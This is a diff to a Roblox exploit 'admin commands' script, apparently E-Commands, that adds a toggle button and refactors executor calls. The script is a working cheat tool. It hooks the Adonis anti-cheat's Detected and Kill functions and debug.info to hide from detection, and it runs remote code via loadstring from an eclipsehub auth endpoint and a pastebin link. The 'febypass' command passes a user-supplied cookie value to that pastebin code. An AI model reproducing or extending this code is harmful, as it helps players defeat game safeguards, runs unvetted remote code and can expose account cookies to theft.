@@ -15,20 +15,32 @@ local function SafeGetService(name) -- credits to nameless admin
 	return Reference(Service(game, name));
 end
 
+local env = getgenv and getgenv() or (_G or shared)
+
 task.spawn(function()
 	for _, rems in pairs(SafeGetService("ReplicatedStorage"):GetChildren()) do
 		if rems:IsA("RemoteEvent") and rems:FindFirstChild("__FUNCTION") then
 			task.spawn(function()
-				local DebugFunc = getinfo or debug.getinfo
+				local getthrident = getthreadidentity or nil
+				local gtgc = getgc or nil
+				local setthrident = setthreadidentity or nil
+				local hkfunc = hookfunction or nil
+				local gtrnv = getrenv or nil
+				local newccl = newcclosure or nil
+				
+				if not (getthrident or gtgc or setthrident or hkfunc or gtrnv or newccl) then
+					return
+				end
+				
 				local IsDebug = false
 				local hooks = {}
-				local oglevel = getthreadidentity()
+				local oglevel = getthrident()
 
 				local DetectedMeth, KillMeth
 
-				setthreadidentity(2)
+				setthrident(2)
 
-				for index, value in getgc(true) do
+				for index, value in gtgc(true) do
 					if typeof(value) == "table" then
 						local detected = rawget(value, "Detected")
 						local kill = rawget(value, "Kill")
@@ -37,7 +49,7 @@ task.spawn(function()
 							DetectedMeth = detected
 
 							local hook
-							hook = hookfunction(DetectedMeth, function(methodName, methodFunc, methodInfo)
+							hook = hkfunc(DetectedMeth, function(methodName, methodFunc, methodInfo)
 								if methodName ~= "_" then
 									if IsDebug then
 										print("Adonis Found\nMethod: " .. tostring(methodName) .. "\nInfo: " .. tostring(methodFunc))
@@ -53,7 +65,7 @@ task.spawn(function()
 						if rawget(value, "Variables") and rawget(value, "Process") and typeof(kill) == "function" and not KillMeth then
 							KillMeth = kill
 							local hook
-							hook = hookfunction(KillMeth, function(killFunc)
+							hook = hkfunc(KillMeth, function(killFunc)
 								if IsDebug then
 									print("Adonis attempted to find: " .. tostring(killFunc))
 								end
@@ -65,7 +77,7 @@ task.spawn(function()
 				end
 
 				local hook
-				hook = hookfunction(getrenv().debug.info, newcclosure(function(...)
+				hook = hkfunc(gtrnv().debug.info, newccl(function(...)
 					local functionName, functionDetails = ...
 
 					if DetectedMeth and functionName == DetectedMeth then
@@ -79,7 +91,7 @@ task.spawn(function()
 					return hook(...)
 				end))
 
-				setthreadidentity(oglevel)
+				setthrident(oglevel)
 			end)
 		end
 	end
@@ -2310,6 +2322,48 @@ G2L["b8"]["Name"] = [[Info]];
 G2L["b8"]["Value"] = [[Command Info: gives you a reanimation script: Sin Dragon (go to the hats game by pressing the hat icon if you dont have the hats for it which costs robux unless you use the free ones available but some free ones are offsale forever or in events)]];
 
 
+-- StarterGui.ECTopBar.TopBar
+G2L["b9"] = Instance.new("Frame", G2L["1"]);
+G2L["b9"]["BorderSizePixel"] = 0;
+G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b9"]["Size"] = UDim2.new(1, 0, 0, 36);
+G2L["b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b9"]["Name"] = [[TopBar]];
+G2L["b9"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.ECTopBar.TopBar.OpenCmdBar
+G2L["ba"] = Instance.new("ImageButton", G2L["b9"]);
+G2L["ba"]["BorderSizePixel"] = 0;
+G2L["ba"]["BackgroundTransparency"] = 0.3;
+G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ba"]["AnchorPoint"] = Vector2.new(1, 0);
+G2L["ba"]["Size"] = UDim2.new(0, 42, 0, 42);
+G2L["ba"]["LayoutOrder"] = 5;
+G2L["ba"]["ClipsDescendants"] = true;
+G2L["ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ba"]["Name"] = [[ToggleCmdBar]];
+G2L["ba"]["Position"] = UDim2.new(1, -50, 0, 10);
+
+
+-- StarterGui.ECTopBar.TopBar.OpenCmdBar.ImageLabel
+G2L["bb"] = Instance.new("ImageLabel", G2L["ba"]);
+G2L["bb"]["BorderSizePixel"] = 0;
+G2L["bb"]["ScaleType"] = Enum.ScaleType.Fit;
+G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bb"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
+G2L["bb"]["Size"] = UDim2.new(0.8, 0, 0.8, 0);
+G2L["bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["bb"]["BackgroundTransparency"] = 1;
+G2L["bb"]["Image"] = getcustomasset and getcustomasset("https://raw.githubusercontent.com/TheEGodOfficial/E-Commands/refs/heads/main/Holder/Assets/cool%20cmd%20icon.png") or "rbxassetid://91802267107725"
+G2L["bb"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
+
+
+-- StarterGui.ECTopBar.TopBar.OpenCmdBar.UICorner
+G2L["bc"] = Instance.new("UICorner", G2L["ba"]);
+G2L["bc"]["CornerRadius"] = UDim.new(0.5, 0);
+
+
 -- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.UICorner
 G2L["a8"] = Instance.new("UICorner", G2L["10"]);
 
@@ -2341,10 +2395,12 @@ local function C_c()
 	
 	local RunService,HttpService,Players,TeleportService,Workspace,ReplicatedStorage,ChatService,TextChatService,UserInputService,TweenService,StarterGui,SoundService,CoreGui = SafeGetService("RunService"),SafeGetService("HttpService"),SafeGetService("Players"),SafeGetService("TeleportService"),SafeGetService("Workspace"),SafeGetService("ReplicatedStorage"),SafeGetService("Chat"),SafeGetService("TextChatService"),SafeGetService("UserInputService"),SafeGetService("TweenService"),SafeGetService("StarterGui"),SafeGetService("SoundService"),SafeGetService("CoreGui")
 
-	local cmdlist = script.Parent.Parent.CmdFrame
+	local cmdlist = script.Parent.Parent:FindFirstChild("CmdFrame")
+	local topbar = script.Parent.Parent:FindFirstChild("TopBar")
+	local togbtn = topbar:FindFirstChild("ToggleCmdBar")
 	local cmdbar = script.Parent
-	local input = cmdbar.Input
-	local output = cmdbar.Output
+	local input = cmdbar:FindFirstChild("Input")
+	local output = cmdbar:FindFirstChild("Output")
 
 	local Loopmute,Loopglitch,flinging,Clip,TPWalk,Toggled,Sprinting,TFlyEnabled = false,false,true,false,false,false,false,false
 	local floatName = "dfkjygsahfyvfnw7f8n538dnd4tgregw6er78red48hx35t6rgn8eewi"
@@ -2414,6 +2470,14 @@ local function C_c()
 				RunService.RenderStepped:Wait()
 				input.Text = prefix
 			end)
+		end
+	end)
+	
+	togbtn.MouseButton1Click:Connect(function()
+		if cmdbar.Visible == true then
+			cmdbar.Visible = false
+		else
+			cmdbar.Visible = true
 		end
 	end)
 
@@ -2837,7 +2901,7 @@ local function C_c()
 
 						if Character and Humanoid and RootPart then
 							if RootPart.Velocity.Magnitude < 50 then
-								getgenv().OldPos = RootPart.CFrame
+								env.OldPos = RootPart.CFrame
 							end
 							if THumanoid and THumanoid.Sit and not AllBool then
 							end
@@ -2953,8 +3017,8 @@ local function C_c()
 							Workspace.CurrentCamera.CameraSubject = Humanoid
 
 							repeat
-								RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
-								Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+								RootPart.CFrame = env.OldPos * CFrame.new(0, .5, 0)
+								Character:SetPrimaryPartCFrame(env.OldPos * CFrame.new(0, .5, 0))
 								Humanoid:ChangeState("GettingUp")
 								table.foreach(Character:GetChildren(), function(_, x)
 									if x:IsA("BasePart") then
@@ -2962,13 +3026,13 @@ local function C_c()
 									end
 								end)
 								task.wait()
-							until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
-							Workspace.FallenPartsDestroyHeight = getgenv().FPDH
+							until (RootPart.Position - env.OldPos.p).Magnitude < 25
+							Workspace.FallenPartsDestroyHeight = env.FPDH
 						else
 						end
 					end
 
-					getgenv().Welcome = true
+					env.Welcome = true
 					if Targets then for _,x in next, Targets do GetPlayer(x) end else return end
 
 					if AllBool then
@@ -3614,9 +3678,9 @@ local function C_c()
 		for _, name in pairs(allcmds.eclipsehub) do
 			if cmd == pf..name then
 				task.spawn(function()
-					getgenv().mainKey = arg1
+					env.mainKey = arg1
 
-					local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(getgenv().mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+					local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(env.mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
 
 					if arg1 == "" or arg1 == nil then
 						output.Text = "Error: You need to put 'nil' if you don't have a key."
@@ -4025,7 +4089,7 @@ local function C_c()
 		for _, name in pairs(allcmds.febypass) do
 			if cmd == pf..name then
 				task.spawn(function()
-					getgenv().CookieArgument = arg1
+					env.CookieArgument = arg1
 					loadstring(game:HttpGet("https://pastebin.com/raw/se4mMrXH"))()
 				end)
 			end
@@ -4450,7 +4514,7 @@ wont respawn. If you want respawn, set it to false
     ["Left Arm"] = true
     ]]
 					}
-					(function() if getgenv then return getgenv() else return _G end end)().fling = nil
+					env.fling = nil
 					local finished = false
 
 					task.spawn(function()
@@ -4745,6 +4809,12 @@ https://discord.com/invite/aEZpBEHgMT
 		end
 
 		Commands(prefix, input.Text)
+	end)
+	
+	task.spawn(function()
+		NAProtection(cmdbar)
+		NAProtection(cmdlist)
+		NAProtection(topbar)
 	end)
 
 	local chatprefix = TextChatService.ChatVersion == Enum.ChatVersion.TextChatService and "&gt;" or ">"
